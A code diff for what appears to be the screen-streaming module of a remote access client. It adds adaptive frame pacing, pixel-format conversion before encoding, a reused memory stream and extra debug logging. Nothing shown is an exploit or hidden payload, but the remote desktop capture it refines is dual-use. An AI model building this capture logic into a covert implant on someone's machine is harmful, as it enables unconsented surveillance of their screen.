@@ -305,22 +305,39 @@ namespace Pulsar.Client.Messages
                 return;
             }
 
+            int adaptiveDelay = 16;
+            var lastCaptureTime = DateTime.UtcNow;
+
             while (!cancellationToken.IsCancellationRequested)
             {
                 try
                 {
-                    // wait for frame requests if the buffer is full or no frames are requested
-                    if (_frameBuffer.Count >= MAX_BUFFER_SIZE || _pendingFrameRequests <= 0)
+                    if (_frameBuffer.Count >= MAX_BUFFER_SIZE)
+                    {
+                        adaptiveDelay = Math.Min(adaptiveDelay + 5, 100);
+                    }
+                    else if (_pendingFrameRequests > 5)
+                    {
+                        adaptiveDelay = Math.Max(adaptiveDelay - 2, 8);
+                    }
+                    else if (_pendingFrameRequests <= 0)
                     {
                         Debug.WriteLine($"Waiting for frame requests. Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
                         _frameRequestEvent.WaitOne(500);
-
-                        // if cancellation was requested during the wait
+                        
                         if (cancellationToken.IsCancellationRequested)
                             break;
-
                         continue;
                     }
+
+                    var elapsedSinceLastCapture = (DateTime.UtcNow - lastCaptureTime).TotalMilliseconds;
+                    if (elapsedSinceLastCapture < adaptiveDelay)
+                    {
+                        Thread.Sleep(1);
+                        continue;
+                    }
+
+                    lastCaptureTime = DateTime.UtcNow;
 
                     // capture frame and add to buffer
                     byte[] frameData = CaptureFrame();
@@ -332,7 +349,7 @@ namespace Pulsar.Client.Messages
                         _frameCount++;
                         if (_stopwatch.ElapsedMilliseconds >= 1000)
                         {
-                            Debug.WriteLine($"Capture FPS: {_frameCount}, Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
+                            Debug.WriteLine($"Capture FPS: {_frameCount}, Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}, Adaptive delay: {adaptiveDelay}ms");
                             _lastFrameRate = _frameCount;
                             _frameCount = 0;
                             _stopwatch.Restart();
@@ -355,6 +372,8 @@ namespace Pulsar.Client.Messages
             Debug.WriteLine("Buffered capture loop ended");
         }
 
+        private MemoryStream _reusableStream = new MemoryStream();
+        
         private byte[] CaptureFrame()
         {
             try
@@ -362,7 +381,7 @@ namespace Pulsar.Client.Messages
                 if (_useGPU)
                     _desktop = ScreenHelperGPU.CaptureScreen(_displayIndex);
                 else
-                _desktop = ScreenHelperCPU.CaptureScreen(_displayIndex);
+                    _desktop = ScreenHelperCPU.CaptureScreen(_displayIndex);
 
                 if (_desktop == null)
                 {
@@ -370,19 +389,41 @@ namespace Pulsar.Client.Messages
                     return null;
                 }
 
-                _desktopData = _desktop.LockBits(new Rectangle(0, 0, _desktop.Width, _desktop.Height),
-                    ImageLockMode.ReadWrite, _desktop.PixelFormat);
-
-                using (MemoryStream stream = new MemoryStream())
+                const PixelFormat codecPixelFormat = PixelFormat.Format32bppArgb;
+                Bitmap processedBitmap = _desktop;
+                
+                if (_desktop.PixelFormat != codecPixelFormat)
                 {
-                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
-                    _streamCodec.CodeImage(_desktopData.Scan0,
-                        new Rectangle(0, 0, _desktop.Width, _desktop.Height),
-                        new Size(_desktop.Width, _desktop.Height),
-                        _desktop.PixelFormat, stream);
-
-                    return stream.ToArray();
+                    try
+                    {
+                        processedBitmap = new Bitmap(_desktop.Width, _desktop.Height, codecPixelFormat);
+                        using (Graphics g = Graphics.FromImage(processedBitmap))
+                        {
+                            g.DrawImage(_desktop, 0, 0, _desktop.Width, _desktop.Height);
+                        }
+                        _desktop.Dispose();
+                        _desktop = processedBitmap;
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error converting pixel format: {ex.Message}");
+                        processedBitmap = _desktop;
+                    }
                 }
+
+                _desktopData = processedBitmap.LockBits(new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
+                    ImageLockMode.ReadWrite, processedBitmap.PixelFormat);
+
+                _reusableStream.Position = 0;
+                _reusableStream.SetLength(0);
+
+                if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
+                _streamCodec.CodeImage(_desktopData.Scan0,
+                    new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
+                    new Size(processedBitmap.Width, processedBitmap.Height),
+                    processedBitmap.PixelFormat, _reusableStream);
+
+                return _reusableStream.ToArray();
             }
             catch (Exception ex)
             {
@@ -758,8 +799,8 @@ namespace Pulsar.Client.Messages
         {
             Dispose(true);
             GC.SuppressFinalize(this);
-        }
-
+        }        
+        
         protected virtual void Dispose(bool disposing)
         {
             if (disposing)
@@ -768,6 +809,7 @@ namespace Pulsar.Client.Messages
                 _streamCodec?.Dispose();
                 _cancellationTokenSource?.Dispose();
                 _frameRequestEvent?.Dispose();
+                _reusableStream?.Dispose();
                 
                 _drawingThreadRunning = false;
                 _drawingSignal.Set();
